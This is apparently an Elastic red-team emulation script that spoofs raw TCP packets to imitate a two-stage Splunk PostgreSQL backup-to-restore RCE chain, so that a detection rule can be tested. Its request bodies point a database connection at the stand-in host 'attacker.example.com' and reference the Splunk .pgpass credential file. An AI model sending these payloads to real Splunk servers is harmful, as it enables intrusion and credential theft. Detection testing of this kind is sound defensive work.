# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: Splunk Enterprise PostgreSQL Backup-to-Restore Potential RCE Sequence
# RTA: network_splunk_postgres_backup_restore_rce_sequence.py
# Description: Emulates the two-stage CVE-2026-20253 pre-auth RCE chain against
#              the Splunk Enterprise PostgreSQL sidecar recovery API. The exploit
#              first POSTs to the `/recovery/backup` endpoint to stage an
#              attacker-controlled dump, then POSTs to `/recovery/restore` to load
#              and execute it. The rule fires when the SAME source.ip sends a POST
#              to both `/backup` and `/restore` on the SAME destination.ip within a
#              15-minute window.
#
#              This RTA crafts two complete HTTP transactions on the wire via raw
#              IP/TCP packets, each emitted from the same spoofed source IP to the
#              same private destination IP:
#                1. POST .../v1/postgres/recovery/backup   -> HTTP/1.1 400
#                2. POST .../v1/postgres/recovery/restore  -> HTTP/1.1 400
#
#              Each transaction is a full bidirectional flow so the sensor parses
#              both the request (url.path, http.request.method) and the response
#              (http.response.status_code):
#                SYN -> SYN/ACK -> PSH/ACK (HTTP request)
#                    -> PSH/ACK (HTTP 400 response) -> RST
#
#              A network sensor with HTTP parsing — Packetbeat / network_traffic
#              (logs-network_traffic.http*), Zeek (logs-zeek.http*), or Suricata
#              (logs-suricata.eve*) — observing cleartext recovery traffic
#              (downstream of TLS termination) decodes each transaction as:
#                - http.request.method = "POST"
#                - url.path containing "splunkd/__raw/v1/postgres/recovery/backup"
#                  and ".../restore" respectively
#                - http.response.status_code = 400
#                - matching source.ip + destination.ip pair
#
#              Both transactions from the same source.ip + destination.ip within
#              the 15-minute aggregation window satisfy the ES|QL threshold
#              (backup_count >= 1 and restore_count >= 1).
#
#              Source is spoofed (no live Splunk server is required) and the
#              destination is non-local so packets egress the physical NIC where
#              the sensor captures — connecting to a loopback address would route
#              through `lo`, which Packetbeat does not capture. The HTTP responses
#              are crafted by this RTA, not returned by a real server.
#
#              Requires CAP_NET_RAW (run as root or with the capability set). The
#              kernel may drop egress packets carrying a foreign source IP under
#              reverse-path filtering; the sensor only needs to observe the
#              packets on the wire to produce the HTTP events.

import logging
import os
import random
import socket
import struct
import time

from . import OSType, RuleMetadata, register_code_rta

log = logging.getLogger(__name__)

# Splunk Web default port (8000) — it is in the default Network Packet Capture /
# Packetbeat HTTP port list, so the sensor parses this traffic as cleartext HTTP
# without extra configuration. The rule does not filter on port; it matches on
# url.path. (splunkd's management port 8089 is HTTPS by default and not in the
# default HTTP port list, so it would require TLS termination plus an added HTTP
# port; the sidecar can alternatively be monitored on TCP 5435.)
SPLUNK_PORT = 8000

# Source is spoofed so gateway RST/ICMP replies go to a non-existent host and
# never reach our kernel's TCP stack. Destination is non-local so the flow
# egresses the physical NIC the sensor watches.
SPOOFED_SOURCE_IP = "10.20.30.40"
PRIVATE_DESTINATION_IP = "10.10.10.10"

_RECOVERY_BASE = "/services/splunkd/__raw/v1/postgres/recovery"

_TCP_RST = 0x04
_TCP_ACK = 0x10
_TCP_PSHACK = 0x18  # PSH | ACK
_TCP_SYN = 0x02
_TCP_SYNACK = 0x12  # SYN | ACK


def _ones_complement_sum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i + 1]
    s = (s & 0xFFFF) + (s >> 16)
    s += s >> 16
    return ~s & 0xFFFF


def _build_raw_packet(
    src_ip: str,
    dst_ip: str,
    src_port: int,
    dst_port: int,
    tcp_flags: int,
    seq: int,
    ack_seq: int,
    payload: bytes = b"",
) -> bytes:
    """Build a complete raw IP/TCP packet with optional application payload."""
    src_bytes = socket.inet_aton(src_ip)
    dst_bytes = socket.inet_aton(dst_ip)

    data_offset = 5 << 4  # 20-byte TCP header, no options
    tcp_seg_len = 20 + len(payload)

    tcp_header = struct.pack(
        "!HHIIBBHHH",
        src_port, dst_port, seq, ack_seq,
        data_offset, tcp_flags, 8192, 0, 0,
    )
    pseudo = struct.pack(
        "!4s4sBBH",
        src_bytes, dst_bytes, 0, socket.IPPROTO_TCP, tcp_seg_len,
    )
    tcp_checksum = _ones_complement_sum(pseudo + tcp_header + payload)
    tcp_header = struct.pack(
        "!HHIIBBHHH",
        src_port, dst_port, seq, ack_seq,
        data_offset, tcp_flags, 8192, tcp_checksum, 0,
    )

    ip_total_len = 20 + 20 + len(payload)
    ident = random.randint(0, 0xFFFF)
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, ip_total_len, ident, 0, 64, socket.IPPROTO_TCP, 0,
        src_bytes, dst_bytes,
    )
    ip_checksum = _ones_complement_sum(ip_header)
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, ip_total_len, ident, 0, 64, socket.IPPROTO_TCP, ip_checksum,
        src_bytes, dst_bytes,
    )

    return ip_header + tcp_header + payload


def _http_post(path: str, body: bytes) -> bytes:
    """Build a raw HTTP/1.1 POST request to a Splunk recovery endpoint."""
    request_line = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {PRIVATE_DESTINATION_IP}:{SPLUNK_PORT}\r\n"
        "User-Agent: python-requests/2.31.0\r\n"
        "Accept: */*\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()
    return request_line + body


def _http_400() -> bytes:
    """Build a raw HTTP/1.1 400 response — what a vulnerable sidecar handler returns."""
    body = b'{"messages":[{"type":"ERROR","text":"invalid recovery request"}]}'
    head = (
        "HTTP/1.1 400 Bad Request\r\n"
        "Content-Type: application/json; charset=UTF-8\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()
    return head + body


def _http_transaction(sock: socket.socket, client_port: int, path: str, body: bytes) -> None:
    """
    Emit one full HTTP transaction (request + response) on the wire via raw
    packets so the sensor parses both url.path/method and response status code:
      SYN -> SYN/ACK -> PSH/ACK(request) -> PSH/ACK(400 response) -> RST
    """
    request = _http_post(path, body)
    response = _http_400()
    cli_isn = random.randint(0x10000000, 0x7FFFFFFF)
    srv_isn = random.randint(0x10000000, 0x7FFFFFFF)

    def send(
        src_ip: str,
        dst_ip: str,
        sport: int,
        dport: int,
        flags: int,
        seq: int,
        ack: int,
        payload: bytes = b"",
    ) -> None:
        pkt = _build_raw_packet(src_ip, dst_ip, sport, dport, flags, seq, ack, payload)
        _ = sock.sendto(pkt, (dst_ip, dport))

    # Client SYN
    send(SPOOFED_SOURCE_IP, PRIVATE_DESTINATION_IP, client_port, SPLUNK_PORT,
         _TCP_SYN, cli_isn, 0)
    time.sleep(0.02)
    # Server SYN/ACK
    send(PRIVATE_DESTINATION_IP, SPOOFED_SOURCE_IP, SPLUNK_PORT, client_port,
         _TCP_SYNACK, srv_isn, cli_isn + 1)
    time.sleep(0.02)
    # Client PSH/ACK carrying the HTTP request
    send(SPOOFED_SOURCE_IP, PRIVATE_DESTINATION_IP, client_port, SPLUNK_PORT,
         _TCP_PSHACK, cli_isn + 1, srv_isn + 1, request)
    log.info("HTTP POST %s sent from %s:%d", path, SPOOFED_SOURCE_IP, client_port)
    time.sleep(0.05)
    # Server PSH/ACK carrying the HTTP 400 response
    send(PRIVATE_DESTINATION_IP, SPOOFED_SOURCE_IP, SPLUNK_PORT, client_port,
         _TCP_PSHACK, srv_isn + 1, cli_isn + 1 + len(request), response)
    time.sleep(0.02)
    # Client RST closes the flow so the sensor emits the completed transaction
    send(SPOOFED_SOURCE_IP, PRIVATE_DESTINATION_IP, client_port, SPLUNK_PORT,
         _TCP_RST, cli_isn + 1 + len(request), srv_isn + 1 + len(response))


@register_code_rta(
    id="367ac03d-acaa-47c4-bfba-6be0c24b2a9b",
    name="network_splunk_postgres_backup_restore_rce_sequence",
    platforms=[OSType.LINUX],
    endpoint_rules=[],
    siem_rules=[
        RuleMetadata(
            id="7c7d2a89-b7e9-4e8d-bbf2-5a782fdcc803",
            name="Splunk Enterprise PostgreSQL Backup-to-Restore Potential RCE Sequence",
        )
    ],
    techniques=["T1190"],
)
def main() -> None:
    """Emit a backup POST then a restore POST from the same source to the same Splunk host."""
    if os.geteuid() != 0:
        log.error("Raw socket privileges required (run as root or with CAP_NET_RAW)")
        return

    # Stage 1 of the chain: place an attacker-controlled dump via backup.
    backup_body = (
        b'{"database":"host=attacker.example.com hostaddr=203.0.113.10 '
        b'dbname=template1","backupFile":"/tmp/staged.dump"}'
    )
    # Stage 2 of the chain: load and execute the staged dump via restore.
    restore_body = (
        b'{"database":"passfile=/opt/splunk/var/packages/data/postgres/.pgpass '
        b'dbname=template1","backupFile":"/tmp/staged.dump"}'
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    base_port = random.randint(32768, 60000)

    log.info(
        "Splunk recovery backup-to-restore emulation: %s -> %s:%d",
        SPOOFED_SOURCE_IP, PRIVATE_DESTINATION_IP, SPLUNK_PORT,
    )

    try:
        _http_transaction(sock, base_port, f"{_RECOVERY_BASE}/backup", backup_body)
        time.sleep(0.5)
        _http_transaction(sock, base_port + 1, f"{_RECOVERY_BASE}/restore", restore_body)
        log.info("Backup-to-restore sequence emitted")
    finally:
        sock.close()
